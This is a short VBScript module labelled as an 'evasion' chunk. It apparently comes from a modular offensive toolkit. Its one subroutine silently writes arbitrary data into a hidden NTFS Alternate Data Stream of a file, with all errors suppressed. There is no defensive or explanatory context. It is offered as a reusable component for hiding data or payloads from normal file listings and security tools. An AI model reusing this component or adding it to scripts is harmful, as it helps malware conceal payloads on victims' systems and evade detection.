' chunk: evasion/ads_exec
' depends: (none)
' provides: ads_write
' format: vbscript
' note: Write data to NTFS Alternate Data Stream

Sub ads_write(filePath, streamName, data)
    On Error Resume Next
    Dim adsPath, stream
    adsPath = filePath & ":" & streamName
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 2
    stream.Charset = "utf-8"
    stream.Open
    stream.WriteText data
    stream.SaveToFile adsPath, 2
    stream.Close
End Sub
